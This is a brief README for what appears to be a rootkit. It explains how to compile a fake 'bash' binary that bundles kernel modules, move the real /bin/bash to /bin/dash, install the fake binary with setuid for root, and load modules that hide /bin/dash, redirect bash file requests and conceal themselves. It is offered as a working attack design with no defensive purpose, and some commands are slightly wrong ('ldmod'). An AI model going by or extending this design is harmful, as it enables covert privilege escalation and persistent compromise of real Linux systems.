# How to compile it

```
make
```
- all files in `../*.ko` will be packed into file_contexts.inl
- a binary called `bash` will be generated

# How it works
```
mv /bin/bash /bin/dash
```
and copy the program to /bin/bash

remember to add `setuid` to access root privillage

if user execute the program like:
```
bash
```
the program will:
- extract all `ko` files to /tmp/*.ko
- ldmod /tmp/*.ko
- rm -r /tmp/*.ko
- run the real bash(`/bin/bash` is redirect to `/bin/dash` by one of `.ko` files, so execve("/bin/bash"))

one of the ko files should:
- hide the file `/bin/dash`
- redirect all file requests with `/bin/bash` to `bin/dash`
- hide itself
